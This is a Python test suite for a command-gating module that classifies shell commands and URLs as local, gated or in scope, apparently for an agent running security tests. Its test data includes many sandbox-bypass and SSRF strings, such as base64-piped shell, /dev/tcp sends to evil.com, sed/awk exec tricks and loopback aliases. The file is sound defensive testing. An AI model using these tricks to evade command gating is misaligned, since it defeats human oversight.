from pathlib import Path

import pytest

from hub.gate_rules import (
    LOCAL_COMMANDS,
    classify_bash,
    classify_write,
    extract_hosts,
    scope_verdict,
)


@pytest.fixture
def wd(tmp_path):
    return tmp_path.resolve()


def test_local_commands_exact():
    assert LOCAL_COMMANDS == frozenset(
        "grep rg jq cat ls head tail wc sed awk sort uniq cut tr diff file echo pwd mkdir tee".split()
    )


def test_extract_hosts_from_curl():
    assert extract_hosts("curl -s http://localhost:3000/rest/products") == (["localhost:3000"], False)


@pytest.mark.parametrize(
    "text,expected",
    [
        ("curl https://Example.COM/x", ["example.com"]),
        ("curl http://user:pw@intranet:8080/x", ["intranet:8080"]),
        ("curl http://intranet/x", ["intranet"]),
        ("curl http://[::1]:8080/x", ["[::1]:8080"]),
        ("ssh root@10.0.0.1", ["10.0.0.1"]),
        ("nc 10.0.0.1:22", ["10.0.0.1:22"]),
        ("curl localhost", ["localhost"]),
        ("cat < /dev/tcp/evil.com/80", ["evil.com"]),
        ("curl 2130706433", ["2130706433"]),
        ("curl 0x7f000001", ["0x7f000001"]),
        ("curl 127.0.1", ["127.0.1"]),
        ("curl 'a.example.com,b.evil.com'", ["a.example.com", "b.evil.com"]),
        ("curl example.com.", ["example.com"]),
    ],
)
def test_extract_hosts_cases(text, expected):
    hosts, _ = extract_hosts(text)
    assert hosts == expected


@pytest.mark.parametrize(
    "text",
    [
        "curl $H",
        "curl ${H}",
        "curl $(cat h)",
        "curl `cat h`",
        "eval x",
        "curl {a,b}.com",
        "echo Y3VybA== | base64 -d | sh",
    ],
)
def test_indirect_flags(text):
    assert extract_hosts(text)[1] is True


def test_indirect_hosts_are_unknown():
    for cmd in ['H=localhost; curl "$H:3000"', "curl $(cat host.txt)"]:
        hosts, indirect = extract_hosts(cmd)
        assert scope_verdict(hosts, indirect, ["localhost:3000"]) == "unknown"
        assert classify_bash(cmd, Path("/tmp")) == "gated"


def test_scope_wildcard_and_port():
    assert scope_verdict(["api.example.com"], False, ["*.example.com"]) == "in"
    assert scope_verdict(["localhost:8080"], False, ["localhost:3000"]) == "out"
    assert scope_verdict(["localhost:3000"], False, ["localhost:3000"]) == "in"
    assert scope_verdict(["localhost:3000"], False, ["localhost"]) == "in"


def test_scope_no_hosts_and_empty_scope():
    assert scope_verdict([], False, ["a.com"]) == "none"
    assert scope_verdict(["a.com"], False, []) == "out"


def test_out_if_any_host_out():
    hosts, ind = extract_hosts("curl a.example.com b.evil.com")
    assert scope_verdict(hosts, ind, ["*.example.com"]) == "out"


@pytest.mark.parametrize(
    "host,scope,expected",
    [
        ("example.com", ["*.example.com"], "out"),  # apex not covered by wildcard
        ("evilexample.com", ["*.example.com"], "out"),
        ("a.b.example.com", ["*.example.com"], "in"),
        ("evil.com", ["*"], "out"),
        ("evil.com", ["*.com"], "out"),
        ("a.com", ["foo*.com"], "out"),
        ("localhost:3000", [" LocalHost:3000 "], "in"),
        ("example.com", ["http://example.com/"], "in"),
        ("example.com", ["https://example.com/path?q=1"], "in"),
        ("example.com", ["example.com."], "in"),
        ("Example.COM.", ["example.com"], "in"),
        ("example.com:8443", ["https://example.com:8443/x"], "in"),
        ("example.com:80", ["example.com:8443"], "out"),
        ("example.com", ["example.com:8443"], "out"),  # no explicit port only matches port-less entry
        ("[::1]:80", ["[::1]"], "in"),
        ("[::1]", ["[::2]"], "out"),
        ("", ["example.com"], "out"),
        ("127.0.0.1:3000", ["localhost:3000"], "out"),
    ],
)
def test_scope_normalisation(host, scope, expected):
    assert scope_verdict([host], False, scope) == expected


def test_scope_empty_entries_ignored():
    assert scope_verdict(["a.com"], False, ["", "  ", "b.com"]) == "out"


def test_local_pipeline_allowed(wd):
    assert classify_bash("grep -i sql out.txt | sort | uniq", wd) == "local"
    assert classify_bash(f"cat a.txt > {wd}/out.txt 2>&1", wd) == "local"
    assert classify_bash("grep x f 2>/dev/null && ls; pwd", wd) == "local"
    assert classify_bash(f"cat x >> {wd}/notes/out.txt", wd) == "local"
    assert classify_bash(f"echo hi | tee {wd}/out.txt", wd) == "local"
    assert classify_bash(f"sed -i s/a/b/ {wd}/f.txt", wd) == "local"
    assert classify_bash("sed -n 1,5p f.txt", wd) == "local"
    assert classify_bash("awk -F, 'NR==1' f", wd) == "local"
    assert classify_bash(f"mkdir -p {wd}/a/b", wd) == "local"
    assert classify_bash("cat README.md script.sh", wd) == "local"


def test_local_with_redirect_outside_workdir_gated(wd):
    assert classify_bash("cat x > /etc/hosts", wd) == "gated"
    assert classify_bash("sed -i s/a/b/ ~/.zshrc", wd) == "gated"
    assert classify_bash("cat x >> ../outside", wd) == "gated"
    assert classify_bash("cat x >~/x", wd) == "gated"
    assert classify_bash("cat x &> /tmp/x", wd) == "gated"
    assert classify_bash("cat x >&/tmp/x", wd) == "gated"
    assert classify_bash("cat x >| /tmp/x", wd) == "gated"


def test_relative_write_targets_gated(wd):
    # R9: the shell's cwd is unobservable, so only absolute in-workdir targets are local
    for cmd in [
        "cat x > out.txt",
        "cat x >> notes/out.txt",
        "echo hi | tee out.txt",
        "sed -i s/a/b/ f.txt",
        "mkdir -p a/b",
        "mkdir a",
        "cat x > ./out.txt",
    ]:
        assert classify_bash(cmd, wd) == "gated", cmd


def test_unlisted_binary_gated(wd):
    for cmd in ["nmap -sV localhost", "python3 -c 1"]:
        assert classify_bash(cmd, wd) == "gated"


def test_xargs_and_procsub_gated(wd):
    assert classify_bash("ls | xargs cat", wd) == "gated"
    assert classify_bash("cat <(curl x.com)", wd) == "gated"
    assert classify_bash("cat x >(sh)", wd) == "gated"


@pytest.mark.parametrize(
    "cmd",
    [
        "env curl evil.com",
        "command curl evil.com",
        "bash -c 'curl evil.com'",
        'sh -c "curl evil.com"',
        "/usr/bin/curl evil.com",
        "./curl x",
        "ls\ncurl evil.com",
        "ls\rcurl evil.com",
        "ls & curl evil.com",
        "ls &",
        "ls |& cat",
        "(curl evil.com)",
        "ls; (curl x)",
        "cat < /etc/passwd",
        "cat <<< x",
        "ls 'unterminated",
        "ls \\",
        "",
        "   ",
        "FOO=1 cat x",
        "c\\url x",
        "echo a#b; curl x",
        "echo ok # hi\ncurl x",
        'awk \'BEGIN{system("curl x")}\'',
        "awk 'BEGIN{\"curl x\" | getline}'",
        'awk \'BEGIN{print 1 > "/dev/tcp/h/80"}\'',
        "awk -f prog.awk x",
        "awk -i inplace 1 x",
        "sed -e 1e\\ curl x",
        "sed '1e curl x' f",
        "sed '1ecurl x' f",
        "sed 's/a/b/e' f",
        "sed 's/a/b/w /etc/x' f",
        "sed 's/a/b/gw out' f",
        "sed 'w /etc/x' f",
        "sed -f script.sed f",
        "sed --in-place s/a/b/ /etc/hosts",
        "sed -ni s/a/b/p /etc/hosts",
        "sed -i.bak s/a/b/ ../x",
        "sed -n -e p -i /etc/x",
        "tee /etc/x",
        "tee ../x",
        "tee -a /dev/tcp/evil.com/80",
        "tee --output-error x",
        "echo hi > /dev/tcp/10.0.0.1/80",
        "echo hi >/dev/tcp/10.0.0.1/80",
        "mkdir /tmp/x",
        "mkdir -m 777 x",
        "sort -o /etc/x f",
        "sort -ro /etc/x f",
        "sort --output=/etc/x f",
        "sort --compress-program=sh f",
        "rg --pre sh x",
        "rg --pre=sh x",
        "rg --hostname-bin sh x",
        "uniq in /etc/out",
        "file -C",
        "echo $HOME",
        "echo ${HOME}",
        "echo $'\\x63url'",
        "echo `id`",
        "echo $(id)",
        "eval ls",
        "echo a | curl evil.com",
        "ls && nmap x",
        "ls || nmap x",
        "echo http://evil.com",
        "echo evil.com",
        "cat 10.0.0.1",
        "cat {a,b}",
        "ls ;; ls",
        "xargs ls",
        "echo xargs",
        "cat x > $HOME/y",
        'cat x > "$(pwd)/y"',
        "echo a\x00b",
        # fix round 1
        "rg x *",
        "sort *",
        "cat ?",
        "cat [a]",
        "cat x *.txt",
        f"tee {{wd}}/.[.]/y",
        f"tee {{wd}}/ln?/y",
        f"cat x > {{wd}}/--pre=sh",
        f"tee {{wd}}/-x",
        f"mkdir {{wd}}/-p",
        f"sed -i s/a/b/ {{wd}}/-f",
        "cat x >! /etc/passwd",
        "cat x >>! ~/.zshrc",
        "cat x >&! /path",
        "cat x > !",
        "cat x >! out",
        "cat x > $=HOME/.zshrc",
        "cat x > $~HOME/.zshrc",
        "cat x > $^HOME/.zshrc",
        "cat x > $[1]/y",
        "cat $",
        "sed -i'/etc/*' s/a/a/ f.txt",
        "sed -i.bak s/a/a/ f.txt",
        "sed --in-place=../../* s/a/a/ f.txt",
        "sed --in-place=x s/a/a/ f.txt",
        "cat x > ~-/y",
        "tee ~-/y",
        "tee ~+/y",
        "tee ~1/y",
        "cat x > ~root/y",
        "cat x > ~+/y",
        "cat x << EOF",
    ],
)
def test_bypass_cases_gated(cmd, wd):
    cmd = cmd.replace("{wd}", str(wd))
    assert classify_bash(cmd, wd) == "gated", cmd


def test_symlink_in_workdir_escape(wd, tmp_path_factory):
    outside = tmp_path_factory.mktemp("outside").resolve()
    (wd / "link").symlink_to(outside)
    assert classify_bash(f"cat x > {wd}/link/y", wd) == "gated"
    assert classify_write(f"{wd}/link/y", wd) == "denied"
    assert classify_bash(f"cat x > {wd}/real.txt", wd) == "local"


def test_write_inside_workdir_only(wd):
    assert classify_write("../../etc/x", wd) == "denied"
    assert classify_write("a/b.txt", wd) == "denied"  # relative paths refused
    assert classify_write("./b.txt", wd) == "denied"
    assert classify_write("~-/b", wd) == "denied"
    assert classify_write(str(wd / "a" / "b.txt"), wd) == "local"
    assert classify_write(str(wd / "a" / ".." / "b.txt"), wd) == "local"
    assert classify_write("/etc/x", wd) == "denied"
    assert classify_write("~/x", wd) == "denied"
    assert classify_write("a/../../x", wd) == "denied"
    assert classify_write("", wd) == "denied"
    assert classify_write("a\x00b", wd) == "denied"
    assert classify_write(str(wd) + "-sibling/x", wd) == "denied"


def test_tilde_expands_to_real_home_not_workdir(wd, monkeypatch):
    monkeypatch.setenv("HOME", str(wd))  # a spoofed HOME must not make ~ look local
    assert classify_write("~/x", wd) == "denied"
    assert classify_bash("cat x > ~/y", wd) == "gated"


IN = ["in.scope.com"]


@pytest.mark.parametrize(
    "cmd",
    [
        "curl in.scope.com evil.com#x",
        "curl in.scope.com evil.com%",
        "curl in.scope.com evil.com+x",
        "curl in.scope.com b\u00fccher.de",
        "curl in.scope.com ex\u0430mple.com",
        "curl in.scope.com evil\u3002com",
        "curl --resolve in.scope.com:443:2606:4700::1111 https://in.scope.com",
        "curl in.scope.com 127.1",
        "curl in.scope.com 1234567",
        "curl in.scope.com 0x7f.1",
        "curl in.scope.com intranet",
        "curl in.scope.com -xintranet",
        "bash -c 'curl in.scope.com intranet'",
        "curl in.scope.com 'a b'",
    ],
)
def test_hidden_host_next_to_in_scope_host_is_not_in(cmd):
    hosts, indirect = extract_hosts(cmd)
    assert scope_verdict(hosts, indirect, IN) in ("out", "unknown"), (cmd, hosts, indirect)


def test_unbracketed_ipv6_detected():
    hosts, _ = extract_hosts("curl --resolve a.com:443:2606:4700::1111 x")
    assert any("2606:4700::1111" in h for h in hosts)


def test_strict_ok_shapes_stay_known():
    assert extract_hosts("curl -s -X POST http://localhost:3000/x -m 5") == (["localhost:3000"], False)
    assert extract_hosts("curl in.scope.com")[1] is False


@pytest.mark.parametrize(
    "cmd",
    [
        "ssh -J in.scope.com,evil in.scope.com",
        "ssh -oProxyJump=in.scope.com,evil in.scope.com",
        "curl --connect-to in.scope.com:443:intranet:443 https://in.scope.com",
        "curl -x in.scope.com:3128,evil in.scope.com",
        "curl in.scope.com:evil",
        "curl -x EVIL in.scope.com",
        "curl in.scope.com EVIL",
        "curl in.scope.com GOOGLE",
        "curl -xevil in.scope.com",
        "ssh -Jevil in.scope.com",
        "curl -Kcfg in.scope.com",
        "wget -iurls in.scope.com",
        "curl in.scope.com 0",
        "curl in.scope.com 2130",
        "curl in.scope.com 99999",
        "curl in.scope.com\nevil",
        "curl in.scope.com ;evil",
        "curl in.scope.com |evil",
        "curl in.scope.com && evil",
        "curl -x",
        "curl --foo=intranet in.scope.com",
        "curl --proxy intranet in.scope.com",
        "curl -m evil in.scope.com",
    ],
)
def test_strict_allowances_do_not_hide_hosts(cmd):
    hosts, indirect = extract_hosts(cmd)
    assert scope_verdict(hosts, indirect, IN) in ("out", "unknown"), (cmd, hosts, indirect)


def test_strict_legit_shapes_stay_known():
    for cmd in [
        "curl -sS -X POST --max-time 5 -m 3 https://in.scope.com/a?b=c",  # no -L: I6
        "curl --request=PUT in.scope.com:8443",
        "ssh root@in.scope.com",
        "curl -x in.scope.com:3128 in.scope.com",
        "ssh -p 22 in.scope.com",
    ]:
        hosts, indirect = extract_hosts(cmd)
        assert indirect is False, cmd
        assert scope_verdict(hosts, indirect, IN + ["in.scope.com:3128", "in.scope.com:8443"]) == "in", cmd


def test_input_file_flags_with_workdir_path_not_in(wd):
    for cmd in [f"curl -K {wd}/cfg in.scope.com", f"curl --config {wd}/cfg in.scope.com", f"wget -i {wd}/urls in.scope.com", f"curl {wd}/x in.scope.com"]:
        hosts, indirect = extract_hosts(cmd, workdir=wd)
        assert scope_verdict(hosts, indirect, IN) in ("out", "unknown"), cmd
    hosts, indirect = extract_hosts(f"curl -o {wd}/x in.scope.com", workdir=wd)
    assert scope_verdict(hosts, indirect, IN) == "in"


@pytest.mark.parametrize(
    "cmd",
    [
        "curl -x \"intranet\":3128 in.scope.com",
        "curl -x 'intranet':3128 in.scope.com",
        "curl -x intranet\\:3128 in.scope.com",
        "curl in.scope.com 'evil'.com",
        "curl in.scope.com \"evil\".com",
        "curl in.scope.com evil\\.com",
        "curl in.scope.com evil'.'com",
        "ssh -J 'jump':22 in.scope.com",
        "ssh -J \"evil\".com in.scope.com",
        "\"curl\" -x 'intranet':1 in.scope.com",
        "curl \"in.scope.com\"@'evil'.com",
        "curl in.scope.com /'/'evil",
        "curl in.scope.com '/'/evil",
    ],
)
def test_quoted_words_cannot_hide_hosts(cmd):
    hosts, indirect = extract_hosts(cmd)
    assert scope_verdict(hosts, indirect, IN) in ("out", "unknown"), (cmd, hosts, indirect)


def test_dequoted_hosts_are_collected():
    hosts, _ = extract_hosts("curl in.scope.com 'evil'.com")
    assert "evil.com" in hosts


def test_quoted_head_and_method_ok():
    assert extract_hosts("'curl' -X 'POST' in.scope.com") == (["in.scope.com"], False)
    assert extract_hosts("curl in.scope.com", workdir=None)[1] is False


def test_output_flag_per_program(wd):
    ok = lambda c: scope_verdict(*extract_hosts(c, workdir=wd), IN) == "in"
    assert ok(f"curl -o {wd}/x in.scope.com")
    assert ok(f"wget --max-redirect=0 -O {wd}/x in.scope.com")
    assert not ok(f"ssh -o {wd}/x in.scope.com")
    assert not ok(f"wget -o {wd}/x in.scope.com")
    assert not ok(f"curl -O {wd}/x in.scope.com")


@pytest.mark.parametrize(
    "cmd",
    [
        "ssh -X INTRANET in.scope.com",
        "ssh -X 'INTRANET' in.scope.com",
        "ssh -X \"EVILHOST\" in.scope.com",
        "ping -X 'ABC' in.scope.com",
        "nmap -X 'ABC' in.scope.com",
        "wget -X 'DIR' in.scope.com",
        "nc -X CONNECT in.scope.com",
        "curl -p 127 in.scope.com",
        "wget -r 99999 in.scope.com",
        "curl -J in.scope.com evil",
        "curl -K in.scope.com",
        "wget -i in.scope.com",
        "wget -e in.scope.com in.scope.com",
        "nmap -iL in.scope.com",
        "ssh -F in.scope.com in.scope.com",
        "curl --unknown-flag in.scope.com",
        "curl --silent=x in.scope.com",
        "python3 -u in.scope.com",
        "dig -t A in.scope.com",
    ],
)
def test_flag_meaning_is_per_program(cmd):
    hosts, indirect = extract_hosts(cmd)
    assert scope_verdict(hosts, indirect, IN) in ("out", "unknown"), (cmd, hosts, indirect)


# flag/value -> the only programs where that flag takes that value
_VALUE_ALLOWANCES = {
    ("-X", "POST"): ["curl"],
    ("-X", "INTRANET"): ["curl"],
    ("-p", "22"): ["ssh", "nc", "nmap", "dig"],
    ("-p", "127"): ["ssh", "nc", "nmap", "dig"],
    ("-r", "5"): [],
    ("-r", "99999"): [],
}
_ALL_HEADS = (
    "curl wget ssh nc nmap http httpie dig nslookup host ping python python3 node ruby perl cat echo"
).split()


@pytest.mark.parametrize(
    "flag,value,prog",
    [
        (flag, value, prog)
        for (flag, value), ok in _VALUE_ALLOWANCES.items()
        for prog in _ALL_HEADS
        if prog not in ok
    ],
)
def test_value_allowances_do_not_leak_across_programs(flag, value, prog):
    hosts, indirect = extract_hosts(f"{prog} {flag} {value} in.scope.com")
    assert scope_verdict(hosts, indirect, IN) in ("out", "unknown"), (prog, flag, value)


@pytest.mark.parametrize(
    "cmd",
    [
        "curl -X POST in.scope.com",
        "ssh -p 22 in.scope.com",
        "ssh -X in.scope.com",
        "ssh -X -p 22 in.scope.com",
        "curl -p -x in.scope.com:3128 in.scope.com",
        "wget --max-redirect=0 -r in.scope.com",
        "wget -qr --tries 3 --max-redirect 0 in.scope.com",
        "nc -vz in.scope.com",
        "nmap -p 443 in.scope.com",
        "ping -c 1 in.scope.com",
        "dig -p 53 in.scope.com",
        "curl -O in.scope.com",
    ],
)
def test_per_program_legit_shapes_stay_in(cmd):
    hosts, indirect = extract_hosts(cmd)
    assert scope_verdict(hosts, indirect, IN + ["in.scope.com:3128"]) == "in", (cmd, hosts, indirect)


# ---- R14: fetch_verdict (WebFetch) ----

from hub.gate_rules import fetch_verdict  # noqa: E402


def _fv(url, scope):
    return fetch_verdict(*extract_hosts(url, strict=False), scope)


@pytest.mark.parametrize(
    "url",
    [
        "http://localhost:3000/", "http://localhost/", "http://intranet/", "http://foo.localhost:3000/",
        "http://127.1:3000/", "http://2130706433:3000/", "http://0x7f.1:3000/", "http://0177.0.0.1:3000/",
        "http://0x7f000001:3000/", "http://[::ffff:127.0.0.1]:3000/", "http://[::1]:3000/", "http://10.0.0.5/",
        "http://127.0.0.1.nip.io:3000/", "http://127-0-0-1.sslip.io/", "http://x.xip.io/", "http://a.localtest.me/",
        "http://lvh.me/", "http://app.lvh.me:3000/", "http://7f000001.nip.io/", "http://magic.127.0.0.1.example.com/",
        "http://printer.local/", "http://db.internal/", "http://www.example.com./x",
        "http://127.0.0.1:8080/",  # port-only mismatch
    ],
)
def test_fetch_verdict_aliases_unknown(url):
    expected = "out" if url == "http://www.example.com./x" else "unknown"
    assert _fv(url, ["127.0.0.1:3000"]) == expected, url


@pytest.mark.parametrize(
    "url,scope",
    [
        ("https://app.example.com/", ["app.example.com:443"]),  # scheme-default port vs explicit port
        ("https://app.example.com:8443/", ["app.example.com:443"]),
        ("https://APP.example.com./", ["app.example.com:443"]),
        ("https://example.com/", ["app.example.com"]),  # parent
        ("https://x.app.example.com/", ["app.example.com"]),  # subdomain
        ("https://example.com/", ["*.example.com"]),  # apex of a wildcard
        ("https://evil.com/?u=https://app.example.com/", ["app.example.com"]),  # mixes an in-scope host
    ],
)
def test_fetch_verdict_related_hosts_unknown(url, scope):
    assert _fv(url, scope) == "unknown", (url, scope)


def test_fetch_verdict_plain_unrelated_is_out_and_exact_is_in():
    assert _fv("https://nvd.nist.gov/vuln/detail/CVE-2024-1", ["127.0.0.1:3000"]) == "out"
    assert _fv("https://github.com/juice-shop/juice-shop", ["app.example.com"]) == "out"
    assert _fv("https://other.example.com/", ["app.example.com"]) == "out"  # sibling: neither parent nor subdomain
    assert _fv("http://127.0.0.1:3000/rest", ["127.0.0.1:3000"]) == "in"
    assert _fv("http://$H/", ["127.0.0.1:3000"]) == "unknown"


# ---- I6: redirect following makes the destination unknowable ----


@pytest.mark.parametrize(
    "cmd",
    [
        "curl -L in.scope.com",
        "curl -sL in.scope.com",
        "curl -sSL -X POST https://in.scope.com/a",
        "curl --location in.scope.com",
        "curl --location-trusted in.scope.com",
        "wget in.scope.com",
        "wget -q in.scope.com",
        "wget -O /dev/null in.scope.com",
        "wget --max-redirect=1 in.scope.com",
        "wget --max-redirect 5 in.scope.com",
        "wget --max-redirect=0 in.scope.com ; wget in.scope.com",  # each wget needs its own
        "http --follow in.scope.com",
    ],
)
def test_redirect_following_is_indirect(cmd):
    hosts, indirect = extract_hosts(cmd)
    assert indirect is True, cmd
    assert scope_verdict(hosts, indirect, IN) == "unknown", cmd


@pytest.mark.parametrize(
    "cmd",
    ["wget --max-redirect=0 in.scope.com", "wget --max-redirect 0 -q in.scope.com", "wget -q --max-redirect=0 -r in.scope.com",
     "curl -s in.scope.com"],
)
def test_no_redirect_shapes_stay_in(cmd):
    assert scope_verdict(*extract_hosts(cmd), IN) == "in", cmd
